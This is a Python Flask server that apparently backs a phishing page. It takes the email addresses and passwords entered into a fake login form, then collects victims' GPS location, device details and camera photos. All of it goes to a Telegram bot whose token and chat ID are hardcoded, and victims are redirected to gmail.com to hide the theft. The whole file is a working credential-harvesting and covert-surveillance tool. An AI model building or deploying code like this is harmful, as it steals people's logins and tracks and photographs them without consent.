from flask import Flask, request, render_template, redirect
import os
import requests

app = Flask(__name__)

BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    message = f"""
🔐 New Credentials:
📧 Email: {email}
🔑 Password: {password}
🌐 IP Address: {ip}
"""
    send_telegram_message(message)
    return redirect('https://gmail.com')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    if data:
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        camera = data.get('camera')
        user_agent = data.get('userAgent')
        device = data.get('deviceInfo')
        ip = data.get('ip') or request.remote_addr  # Use IP from client or fallback

        location_info = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Denied"
        info = f"""
🕵️‍♂️ SpyBot Alert
📌 IP Address: {ip}
{location_info}
📷 Camera: {camera}
🧠 Device: {device}
🌐 UserAgent: {user_agent}
"""
        send_telegram_message(info)
    return 'ok'

@app.route('/photo', methods=['POST'])
def photo():
    if 'photo' in request.files:
        photo = request.files['photo']
        files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        data = {'chat_id': CHAT_ID}
        requests.post(url, data=data, files=files)
    return 'photo received'

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    requests.post(url, data=payload)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
